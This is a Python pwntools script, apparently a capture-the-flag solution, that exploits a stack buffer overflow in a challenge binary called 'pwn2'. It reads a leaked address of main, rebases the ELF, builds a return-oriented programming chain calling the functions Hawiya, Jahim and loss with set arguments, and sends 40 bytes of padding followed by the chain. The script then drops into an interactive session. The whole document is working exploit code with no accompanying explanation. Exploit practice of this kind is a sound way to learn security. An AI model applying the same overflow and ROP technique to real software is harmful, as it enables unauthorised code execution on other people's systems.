import pwnlib.elf
import pwnlib.rop.rop
import pwnlib.tubes.remote
import pwnlib.context
import pwnlib.gdb

pwnlib.context.context.clear(arch='amd64', os='linux')
pwnlib.context.context.terminal = ["tmux", "splitw", "-h"]

# Create gdb server
io = pwnlib.gdb.debug('./pwn2', '''
layout asm
#break *vuln+78
#break *Hawiya+166
#break *Jahim+166
break loss
continue
''')

# Connect to remote server and get the main address
first_line = io.recvline()
print(first_line)
main_address = int(str(first_line).split()[-1][:-3], base=16)
print("main address is", main_address)

# Get the offset of functions
e = pwnlib.elf.ELF('pwn')
e.address += main_address - e.functions['main'].address
print("main address in elf is", e.functions['main'].address)

# Create ROP
r = pwnlib.rop.rop.ROP(e)
r.call('Hawiya')
r.call('Jahim')
r.call('loss', [0x1337c0de, 0xdeadc0de - 0x1337c0de])
print(r.dump())

# Create the payload
payload = bytearray()
payload += ('a' * (0x20 + 8)).encode('ascii') # SUB RSP,0x20 + PUSH RBP, overflow the stack
payload += bytes(r)
print("sending", payload)
io.sendline(payload)
io.interactive()
io.close()